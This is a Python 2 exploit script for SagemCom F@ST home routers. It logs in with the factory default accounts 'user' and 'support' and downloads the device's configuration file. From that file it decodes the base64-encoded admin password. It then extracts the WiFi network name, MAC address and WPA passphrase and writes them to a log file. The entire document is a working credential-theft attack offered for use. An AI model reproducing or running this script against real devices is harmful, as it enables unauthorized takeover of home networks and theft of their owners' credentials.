#!/usr/bin/python

import urllib2, base64, sys, os

class Target(object):
	def __init__(self, host,user):
		self.host = host
		self.username = user
		self.password = user
		self.config = ""
		self.admin = ""

	def getConfigFile(self):

		print "[+] Trying to fetch config file from "+host
		request = urllib2.Request(host+"sysinfo.f24")
		base64string = base64.encodestring('%s:%s' % (self.username, self.password)).replace('\n', '')
		request.add_header("Authorization", "Basic %s" % base64string)
		try:  
			result = urllib2.urlopen(request)
		except:
			print "[-] Could not make request with user \""+self.username+"\""
			return 2
		self.config = result.read()
		
		if "PSI config:" not in self.config:
			print "[-] Unable to download config file... Closing"
			return 1
		else:
			print "[+] Successfuly aquired device's config file"
			return 0

	def getAdmin(self):
		print "[+] Parsing XML file"
		beg = self.config.find("<AdminPassword>")
		beg = beg+15
		end = self.config.find("</AdminPassword>")
		password = self.config[beg:end]
		print "[+] Decoding admin password"
		self.admin = base64.decodestring(password)
		print "\n\n[+] Admin credentials:\tadmin:"+self.admin+"\n\n"

		choice = ""
		while choice == "":
			choice = raw_input("[+] Do you want to save target's informations (ESSID, BSSID, password)?[Y/n] ")
			if choice == "" or choice == "Y" or choice == "y":
				self.saveInfo()
				break
			elif choice != "n" and choice != "N":
				choice = ""

	def saveInfo(self):
		print "[+] Gathering informations ..."
		version = self.config[0:self.config.find("PSI config:")]
		essid = self.config[self.config.find("<WlSsid>")+8:self.config.find("</WlSsid>")]
		bssid = self.config[self.config.find("<WlBssMacAddr>")+14:self.config.find("</WlBssMacAddr>")]
		wpa = self.config[self.config.find("<WlWpa>")+7:self.config.find("</WlWpa>")]
		auth = self.config[self.config.find("<WlAuthMode>")+12:self.config.find("</WlAuthMode>")]
		passphrase = self.config[self.config.find("<WlWpaPsk>")+10:self.config.find("</WlWpaPsk>")]

		logfile = essid.replace("\x20","_")+"-"+bssid+".log"

		print "[+] Saving target's informations as "+logfile


		if not os.path.exists("fast-results"):
			os.makedirs("fast-results")
		try:
			f = open("fast-results/"+logfile, "w")
		except:
			f = open(+logfile, "w")

		f.write("SagemCom F@ST exploitation by Mixbo")
		f.write("\nLast version on www.github.com/Mixbo/FaST2704")
		
		f.write("\n\nTarget name:\t\t"+host)
		f.write("\nESSID:\t\t\t"+essid)
		f.write("\nAdmin account:\t\tadmin:"+self.admin)
		f.write("\nProtection info:\t"+wpa+" "+auth)
		f.write("\nWiFi passphrase:\t"+passphrase)
		f.write("\nTarget mac address:\t"+bssid)
		f.write("\n\nSoftware/Hardware Versions\n###################################\n")
		f.write(version)

		f.close()

def main():
	print "[+] Trying with default user \"user\" "
	target = Target(host,"user")
	opp = target.getConfigFile()
	if opp == 0:
		target.getAdmin()
	elif opp == 2:
		print "[+] Trying with default user \"support\""
		target = Target(host,"support")
		opp = target.getConfigFile()
		if opp == 0:
			target.getAdmin()


if __name__ == '__main__':
	
	if len(sys.argv) > 1:
		host = sys.argv[1]
		if "://" not in host:
			host = "http://"+host
		if host[len(host)-1] != "/":
			host = host+"/"
	else:
		host = "http://192.168.1.1/"
	main()